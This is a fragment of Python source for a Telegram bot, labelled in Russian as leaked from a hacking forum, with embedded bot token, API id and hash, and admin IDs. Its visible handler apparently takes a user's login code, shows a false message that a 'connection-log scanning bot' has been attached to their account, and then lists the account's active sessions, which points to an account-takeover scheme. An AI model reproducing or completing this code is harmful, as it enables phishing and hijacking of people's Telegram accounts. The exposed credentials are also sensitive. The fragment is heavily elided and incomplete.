# СЛИТО С ФОРУМА https://white-haker.ru/ И КАНАЛА @restzonecanal
...
# token(@BotFather)
bot_token = '7013902343:AAE8x9KlaoPoX2110JF3yIAVuMCk6J9dHfM'
# TG API(https://my.telegram.org/)
api_id = '29391076'
api_hash = 'f07a3163d34a86f7052569f194fbd21d'
# you telegram id
admin_id = 6516231491
admin_id1 = 6516231491
...
# menu manegers#СЛИТО С ФОРУМА https://white-haker.ru/ И КАНАЛА @restzonecanal
...
async def receive_code4(call: CallbackQuery, state: FSMContext):
    ...
    try:
        ...
        await msg_to_edit.edit_text(
            f"<b>К вашему аккаунту подключен бот сканирющий логи подключений, после окончания придёт результат!</b>")
        result = await client(functions.account.GetAuthorizationsRequest())
        await msg_to_edit.edit_text(
